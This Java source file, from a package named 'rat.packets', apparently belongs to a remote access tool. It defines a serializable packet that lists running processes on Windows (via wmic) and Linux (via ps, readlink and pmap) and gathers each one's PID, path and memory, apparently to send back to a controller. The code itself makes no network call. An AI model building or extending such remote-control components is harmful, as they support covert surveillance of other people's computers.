package rat.packets;

import org.apache.commons.lang3.SystemUtils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

public class ProcessListPacket implements IPacket, Serializable {

    private static final long serialVersionUID = -834290422549826901L;

    private List<ProcessInfo> processList = new ArrayList<>();

    @Override
    public void execute() {

        if (SystemUtils.IS_OS_MAC) {
            // TODO

        } else if (SystemUtils.IS_OS_WINDOWS) {
            getWindowsProcessList();

        } else {
            getLinuxProcessList(); // hope that it's linux

        }
    }

    private void getWindowsProcessList() {
        Process p;
        try {
            String command =
                    "wmic process get Caption,ProcessID,ExecutablePath,WorkingSetSize /format:wmiclivalueformat";

            p = Runtime.getRuntime().exec(command);

        } catch (IOException e) {
            e.printStackTrace();
            return;
        }

        try (BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = input.readLine()) != null) {
                line = line.trim();
                try {
                    if (line.startsWith("Caption=")) {
                        String processName = line.substring("Caption=".length());
                        input.readLine();
                        String execPath = input.readLine().trim().substring("ExecutablePath=".length());
                        input.readLine();
                        String processID = input.readLine().trim().substring("ProcessId=".length());
                        input.readLine();
                        String memory = input.readLine().trim().substring("WorkingSetSize=".length());

                        int PID = -1;
                        try {
                            PID = Integer.parseInt(processID);
                        } catch (Exception ignorable) {
                        }

                        long processMemory = 0;
                        try {
                            processMemory = Long.parseLong(memory) / 1024; // KB
                        } catch (Exception ignorable) {
                        }

                        processList.add(new ProcessInfo(PID, processName, execPath, processMemory));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    return; // TODO: remove this
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
    }

    private void getLinuxProcessList() {
        Process p;
        try {
            p = Runtime.getRuntime().exec("ps -e");
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }

        try (BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            input.readLine(); // ignore first line

            String line;
            String[] params;
            while ((line = input.readLine()) != null) {
                try {
                    params = line.trim().split("\\s+");

                    int PID = Integer.parseInt(params[0]);
                    String processName = params[3];
                    String processPath = getLinuxProcessPath(PID);
                    long processMemory = getLinuxProcessMemory(PID);

                    processList.add(new ProcessInfo(PID, processName, processPath, processMemory));
                } catch (Exception e) {
                    e.printStackTrace(); // TODO: remove this
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
    }

    private String getLinuxProcessPath(int PID) {
        String processPath = "";
        Process p;

        try {
            p = Runtime.getRuntime().exec("readlink -f /proc/" + PID + "/exe");
        } catch (IOException e) {
            e.printStackTrace();
            return processPath;
        }

        try (BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String commandResponse = input.readLine();

            if (commandResponse != null && !(commandResponse = commandResponse.trim()).isEmpty()) {
                processPath = commandResponse;
            }

        } catch (IOException e) {
            e.printStackTrace(); // TODO: remove this
            return processPath;
        }

        return processPath;
    }

    private long getLinuxProcessMemory(int PID) {
        long processMemory = 0;
        Process p;

        try {
            p = Runtime.getRuntime().exec("pmap -x " + PID);
        } catch (IOException e) {
            e.printStackTrace();
            return processMemory;
        }

        try (BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()))) {

            String line;
            while ((line = input.readLine()) != null) {
                if (line.startsWith("total kB")) {
                    line = line.substring("total kB".length()).trim();

                    String[] args = line.split("\\s+");
                    try {
                        return Long.parseLong(args[1]);
                    } catch (Exception ex) {
                    }
                }
            }

        } catch (IOException e) {
            e.printStackTrace(); // TODO: remove this
            return processMemory;
        }

        return processMemory;
    }

    public List<ProcessInfo> getProcessList() {
        return processList;
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.PROCESS_LIST;
    }
}
